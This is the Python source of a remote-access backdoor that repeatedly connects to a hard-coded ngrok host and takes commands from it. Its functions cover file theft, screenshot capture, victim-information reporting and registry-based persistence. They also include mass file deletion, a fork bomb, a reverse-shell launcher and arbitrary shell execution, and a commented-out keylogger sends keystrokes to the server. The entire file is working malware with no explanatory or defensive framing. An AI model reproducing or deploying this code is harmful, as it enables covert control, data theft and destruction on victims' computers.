import socket,subprocess,sys,os,platform,requests,re,pyautogui,time,threading
import winreg as reg
class Bd:
    keys_list = []
    count = 0
    program_name = os.path.basename(__file__)
    def __init__(self, host, port):
        self.host = str(host)
        self.port = int(port)
    def selfSENDPNG(self):
        while True:
            self.sock.send(b'ok')
            print('B')
            time.sleep(5)
    def commands_initiating(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False
        while (connected == False):
            try:
                time.sleep(2)
                self.sock.connect((self.host, self.port))
                connected = True
            except KeyboardInterrupt:
                sys.exit()
            except:
                pass
        while True:

            try:
                message_command = self.sock.recv(2048)
                message_command_descrypt = message_command.decode("latin1")
                if message_command_descrypt == "exit":
                    self.sock.close()
                    sys.exit()
                try:
                    not_in = ["get_ip", "permanence_mode", "upload", "victims_info", "remove_all", "keylogger_start",
                              "forkbomb", "reverse_tcp", "download", "screenshot", "cat"]
                    if message_command_descrypt == "get_ip":
                        ip = requests.get("https://api.ipify.org").text
                        ip_message = f"The target's IP is: {ip}".encode()
                        self.sock.send(ip_message)
                    if message_command_descrypt.startswith("cat "):
                        try:
                            catfile_name = message_command_descrypt.split(" ")[1]
                            cat_size = os.path.getsize(catfile_name)
                            self.sock.send(str(cat_size).encode())
                            time.sleep(2)
                            with open(catfile_name, "rb") as cat:
                                cat_read = cat.read()
                                self.sock.send(cat_read)
                        except Exception as e:
                            self.sock.send(str(e).encode())
                    if message_command_descrypt == "permanence_mode":
                        try:
                            if sys.platform.startswith("Windows") or sys.platform.startswith('win32'):
                                pth = os.path.dirname(os.path.realpath(__file__))
                                f_name = os.path.basename(__file__)
                                address = os.path.join(pth, f_name)
                                key = reg.HKEY_CURRENT_USER
                                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                                openn = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
                                reg.SetValueEx(openn, "pyperm", 0, reg.REG_SZ, address)
                                reg.CloseKey(openn)
                                self.sock.send("\033[1;32m[+]\033[0;0m Permanence mode activated!".encode("latin1"))
                        except Exception as exc:
                            self.sock.send(str(exc).encode())
                    if message_command_descrypt == "disable_permanence":
                        self.sock.send("\033[31m[-] *\033[0;0m Desativating permanence mode...".encode())
                        try:
                            if sys.platform.startswith("Windows"):
                                key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
                                reg.DeleteValue(key, "pyperm")
                                reg.CloseKey(key)

                        except FileNotFoundError:
                            pass

                        except Exception as e:
                            self.sock.send(str(e).encode())
                        self.sock.send("\033[1;32m[+]\033[0;0m Disabled with success".encode())
                        # except
                    if message_command_descrypt.startswith("download "):
                        file_name = message_command_descrypt.split(" ")[1]
                        data_size = os.path.getsize(file_name)
                        self.sock.send(str(data_size).encode("utf-8"))
                        time.sleep(2)
                        with open(file_name, "rb") as sc:
                            screenshot_data = sc.read()
                            self.sock.send(screenshot_data)

                        print("Transference Done!")
                    elif message_command_descrypt == "remove_all":
                        try:
                            files = os.listdir()
                            for file in files:
                                os.chdir(os.getcwd())
                                os.remove(file)
                        except IsADirectoryError:
                            continue
                        except Exception as e:
                            self.sock.send(str(e).encode())
                    elif message_command_descrypt == "victims_info":
                        info = f"""
                        Operacional System: {sys.platform}
                        Computer Name: {platform.node()}
                        For more advanced info, use: uname -a, uname -r, id
                        """.encode()
                        self.sock.send(info)
                    if message_command_descrypt == "reverse_tcp":
                        self.sock.send("You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode())
                    if message_command_descrypt.startswith("reverse_tcp "):
                        reverseip = message_command_descrypt.split(" ")[1]
                        reverseport = message_command_descrypt.split(" ")[2]
                        subprocess.check_output(
                            f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{reverseip}",{reverseport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
                        """, stderr=subprocess.STDOUT, shell=True)
                        self.sock.send("Reverse Shell Session established with sucess!".encode())
                    if message_command_descrypt == "screenshot":
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screenshot.png")
                        data_size = os.path.getsize("screenshot.png")
                        self.sock.send(str(data_size).encode("latin1"))
                        with open("screenshot.png", "rb") as sc:
                            screenshot_data = sc.read()
                            self.sock.send(screenshot_data)
                        os.remove("screenshot.png")
                    if message_command_descrypt.startswith("upload "):
                        up_filesize = self.sock.recv(1024).decode("latin1")
                        up_filename = message_command_descrypt.split(" ")[2]
                        int_filesize = int(up_filesize)
                        up_data = b""
                        while len(up_data) < int_filesize:
                            up_data += self.sock.recv(int_filesize)
                        with open(up_filename, "wb") as up:
                            up.write(up_data)
                        self.sock.send(
                            f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
                    if message_command_descrypt == "forkbomb":
                        try:
                            while True:
                                os.fork()
                        except Exception as e:
                            self.sock.send(str(e).encode())
                    for value in not_in:
                        if value in message_command_descrypt:
                            message_command_descrypt = "ignoreethislittlemessage"
                    if message_command_descrypt != "ignoreethislittlemessage":
                        command_prompt = subprocess.Popen(message_command_descrypt, stderr=subprocess.PIPE,
                                                          stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                        err = command_prompt.stderr.read()
                        command_prompt = command_prompt.stdout.read()
                        self.sock.send(command_prompt)
                        self.sock.send(err)


                        if command_prompt == b"" and err == b"":
                            self.sock.send("\nOK!\n".encode())
                        elif command_prompt == b"" and err == b"" and message_command_descrypt.startswith("cd ") == True:
                            cd_message = f"You have been moved to {os.getcwd().encode()}".encode()
                            self.sock.send(cd_message)
                except Exception as e:
                    self.sock.send(str(e).encode())
                if message_command_descrypt.startswith("cd"):
                    try:
                        os.chdir(message_command_descrypt[3:])

                    except Exception as e:
                        self.sock.send(str(e).encode())
            except BrokenPipeError:
                back.commands_initiating()
            except KeyboardInterrupt:
                sys.exit()
            except ConnectionResetError:
                back.commands_initiating()
    """def keylogger(self, key):
        current_key = str(key)
        current_key = re.sub(r"Key.space"," ", current_key)
        current_key = re.sub(r"Key.alt_1","\n", current_key)
        current_key = re.sub(r"Key.*","", current_key)
        self.count += 1
        self.keys_list.append(current_key)
        if self.count >= int(self.rang): # Estabilish a range, with sys.argv

            with open("log.txt","w") as text:  # COUNTS THE LETTERS: IF MORE OR EQUAL TO 10, SEND MESSAGE TO SERVER
                for keys in self.keys_list:
                    text.write(keys)

            with open("log.txt","r") as text2:
                text_data = text2.read()

                keylog_ok = "OK!"
                self.sock.send(keylog_ok.encode())

                keylog_size = os.path.getsize("log.txt")
                self.sock.send(str(keylog_size).encode())

                self.sock.send(text_data.encode())
                # os.remove("log.txt")
                # sys.exit()

    def listener(self):
        with Listener(on_press = self.keylogger) as l:
            l.join()"""
if __name__ == '__main__':
    while True:
        try:
            back = Bd("3.tcp.ngrok.io", 25769)
            back.commands_initiating()
        except:
            pass